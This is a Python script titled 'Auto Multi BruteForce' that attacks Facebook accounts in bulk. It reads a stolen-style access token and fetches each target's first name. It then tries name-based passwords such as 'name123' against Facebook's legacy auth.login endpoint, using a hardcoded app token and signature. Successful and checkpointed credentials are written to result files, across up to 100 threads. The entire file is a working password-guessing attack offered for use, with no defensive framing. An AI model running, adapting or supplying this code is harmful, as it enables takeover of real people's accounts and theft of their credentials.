import requests,os,sys,time,json
from multiprocessing.pool import  ThreadPool

class AutoB:
	def __init__(self):
		self.fnd=0
		self.cek=0
		self.hit=0
		self.tar=[]
		self.ken=open('toket/token.txt','r').read()
		self.u='https://graph.facebook.com/{}'
		self.main()

	def nama(self,id):
		try:
			nem=requests.get(self.u.format(id+'/?access_token='+self.ken))
			js=json.loads(nem.text)
			if ' ' in js['first_name']:
				self.attk(id,js['first_name'].split(' ')[0])
			else:
				self.attk(id,js['first_name'])
		except: pass

	def attk(self,idd,name):
		try:
			lid=[name+'123',name+'12345',name+'123456',name.lower()+'123',name.lower()+'12345',name.lower()+'123456',self.spas]
			for x in lid:
				data={'user':idd,'pw':x}
				re=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+data['user']+"&locale=en_US&password="+data['pw']+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				jss=json.loads(re.text)
				if 'access_token' in jss.keys():
					self.fnd+=1
					pen=open('result/found.txt','a')
					pen.write(f'{idd}|{x}\n')
					pen.close()
					for i in open('result/found.txt','r').read().splitlines()[-1:]: print("\r\033[92m[FOUND]\033[97m %s               "%(i))
					break
				elif 'User must verify their account on www.facebook.com (405)' in jss['error_msg']:
					self.cek+=1
					pen=open('result/cek.txt','a')
					pen.write(f'{idd}|{x}\n')
					pen.close()
					for i in open('result/cek.txt','r').read().splitlines()[-1:]: print("\r\033[93m[CHECKPOINT]\033[97m %s               "%(i))
					break
			self.hit+=1
			print(f'\r[CRACK] >> {self.hit}/{len(self.tar)} F[{self.fnd}] CP[{self.cek}] <<',end='')
		except: pass

	def main(self):
		try:
			os.mkdir('result')
		except: pass
		print("""
	;;;;;;;;;;;;;;;;;;;;;;;;;
	; Auto Multi BruteForce ;
	;    By: KANG-NEWBIE    ;
	;;;;;;;;;;;;;;;;;;;;;;;;;
	""")
		fil=input('[?] List Id Target: ')
		try:
			file=open(fil,'r').read().splitlines()
		except FileNotFoundError:
			exit('[!] File not found')
		tan=input('[?] Do you want enter extra password (y/n): ')
		if tan == 'y' or tan == 'Y':
			self.spas=input('[?] Extra password: ')
		else:
			self.spas=''
		for x in file:
			self.tar.append(x)
		p=ThreadPool(int(input("[?] Threads 1-100: ")))
		print()
		p.map(self.nama,self.tar)
		if self.fnd > 0 or self.cek > 0:
			print("\n\nFound ["+str(self.fnd)+"] CheckPoint ["+str(self.cek)+"]")
		else: print("\n[ :( ] nothing found")
		if self.fnd > 0:
			print("FOUND:")
			print("="*30)
			for i in open('result/found.txt','r').read().splitlines()[-+self.fnd:]: print(i)
			print("="*30)
			print("found result saved: result/found.txt")
		if self.cek > 0:
			print("\nCHCEKPOINT:")
			print("="*30)
			for i in open('result/cek.txt','r').read().splitlines()[-+self.cek:]: print(i)
			print("="*30)
			print("check result saved: result/cek.txt")
try:
	AutoB()
except Exception as FCK:
	print(f'Err: {FCK}')